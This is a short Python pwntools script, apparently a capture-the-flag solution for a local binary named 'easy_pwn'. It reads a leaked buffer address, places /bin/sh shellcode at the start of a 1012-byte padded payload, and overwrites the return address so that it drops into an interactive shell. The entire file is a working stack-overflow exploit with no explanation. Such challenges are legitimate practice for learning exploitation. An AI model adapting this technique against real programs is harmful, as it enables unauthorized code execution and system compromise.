from pwn import *

p=process('./easy_pwn')

#raw_input('DEBUG')

m1 = p.recvuntil("I give you a clue: ")

print(m1)

rdata = p.readuntil(b'\n').strip()

buf_addr = int(rdata, 16)
log.info(f"Got address: {hex(buf_addr)}")
eip = p32(buf_addr)


shellcode =asm(shellcraft.sh())


exploit = shellcode

exploit += b"A" * (1012-len(shellcode))

exploit +=p32(buf_addr)

p.sendline(exploit)

p.interactive()


